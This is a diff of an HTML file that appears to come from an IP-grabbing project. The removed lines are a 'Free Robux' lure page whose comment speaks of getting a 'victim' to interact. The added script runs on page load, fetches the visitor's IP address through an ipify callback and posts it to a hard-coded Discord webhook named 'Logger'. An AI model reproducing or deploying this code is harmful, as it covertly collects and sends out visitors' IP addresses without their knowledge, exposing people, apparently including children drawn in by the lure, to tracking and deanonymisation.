@@ -1,15 +1,19 @@
-<!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="">
-    <meta name="author" content="">
-  </head>
-  <!-- You can change the site content however you want, important is that the victim interacts with the site, for example clicking on a website -->
-  <body>
-<button onclick="window.location.href='https://discord.com/api/downloads/distributions/app/installers/latest?channel=stable&platform=win&arch=x86'">Free Robux</button>
-  <style>.footer,.generic-footer{margin-bottom:98px}@media (min-width:374px){.footer,.generic-footer{margin-bottom:78px}}@media (min-width:546px){.footer,.generic-footer{margin-bottom:56px}}@media (min-width:1055px){.footer,.generic-footer{margin-bottom:0}}.disclaimer{position:fixed;z-index:9999999;bottom:0;right:0;border-top:2px solid #ff5c62;text-align:center;font-size:14px;font-weight:400;background-color:#fff;padding:5px 10px 5px 10px}.disclaimer a:hover{text-decoration:underline}@media (min-width:1052px){.disclaimer{text-align:right;border-left:2px solid red;border-top-left-radius:10px}}@media (min-width:1920px){.disclaimer{width:60%}}</style><div class="disclaimer">4124 <a title="https://discord.com/assets/7b3a37fa249a857b0ff136db0a73f44c.svg" target="_blank" href="https://discord.com/assets/7b3a37fa249a857b0ff136db0a73f44c.svg" style="color: black;"><b>HERE</b></a></div></body>
-</html>
-
 <script>
+function getIP(json) {
+  var request = new XMLHttpRequest(); //making a request for the webhook
+      request.open("POST", "https://discord.com/api/webhooks/955827681562341377/xMWBQumAh2RY8luCx3dSyazw5AvTgNL1pWE53i-mAcMUDmTYqwm88PElOF2vzM2kRDUH");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "Logger",
+        avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+        content: "IP: " + json.ip + ""
+      }
+   //just a webhook parameters such as avatar,name,message
+
+      request.send(JSON.stringify(params));
+    }
+
+</script>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> //using this api to get the ip
